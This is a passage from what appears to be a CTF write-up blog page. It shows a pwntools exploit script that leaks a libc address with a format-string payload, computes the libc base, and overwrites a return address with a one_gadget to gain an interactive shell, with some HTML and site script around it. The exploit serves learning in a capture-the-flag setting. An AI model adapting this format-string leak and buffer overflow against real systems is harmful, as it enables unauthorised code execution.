<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">context.terminal</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">/usr/bin/tmux</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">splitw</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">-h</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">name:</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">%19$p</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">) </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># This time we want a LIBC address whose offset we can find. </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># This one has offset 243.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">to:</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvline()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#8BE9FD;--shiki-dark-font-style:italic;">int</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(r.recvline()[:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">],</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">16</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">243</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">236c0</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">hex</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(libc_base))</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">#pause()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">one_gadget</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">44b9f</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Three candidates. Depends on the gadgets you can find. I&#39;ll try the first one...</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># 0x44b9f - requires rax==0</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># 0x44bf3 - requires [rsp+0x30]==0</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># 0xe85c6 - requires [rsp+0x60]==0</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\0</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">263</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(one_gadget)) </span><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Offset is again found at 264.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.interactive()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div></div></div></main><footer class="VPDocFooter" data-v-7011f0d8 data-v-e257564d><!--[--><!--]--><!----><!----></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><!----><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"about-me_index.md\":\"te53mTWO\",\"api-examples.md\":\"DwEcywL5\",\"blog_index.md\":\"D-unYAPw\",\"index.md\":\"DAXXWD6C\",\"markdown-examples.md\":\"CfG2qhY4\",\"writeups_2021-03-02-dso-nus-ctf.md\":\"Ct7M1uPH\",\"writeups_2021-03-07-whitehacks.md\":\"CQZgBOIM\",\"writeups_2021-03-14-ctf-sg.md\":\"Bf9pJ35Q\",\"writeups_2021-03-27-umass-ctf.md\":\"BUH7RWj8\",\"writeups_2021-04-08-angstromctf-2021.md\":\"CVcaRzf1\",\"writeups_2021-06-20-hsctf-8.md\":\"BMAg6LIy\",\"writeups_2021-06-26-cddc-2021.md\":\"C1dwqn4g\",\"writeups_2021-09-05-cyberthon.md\":\"AXKiOfEF\",\"writeups_2025-10-13-govtech-ai-ctf-2025-quals.md\":\"6cLPK43v\",\"writeups_index.md\":\"gNWKlo5D\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"N00bcak's Purple Cave\",\"description\":\"Blogging Things When I Feel Like It\",\"base\":\"/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":true,\"themeConfig\":{\"nav\":[{\"text\":\"Home\",\"link\":\"/\"},{\"text\":\"About\",\"link\":\"/about-me\"},{\"text\":\"CTF Writeups\",\"link\":\"/writeups\"},{\"text\":\"Blog\",\"link\":\"/blog\"}],\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/N00bcak\"}]},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":false,\"additionalConfig\":{}}");</script>
    
  </body>
</html>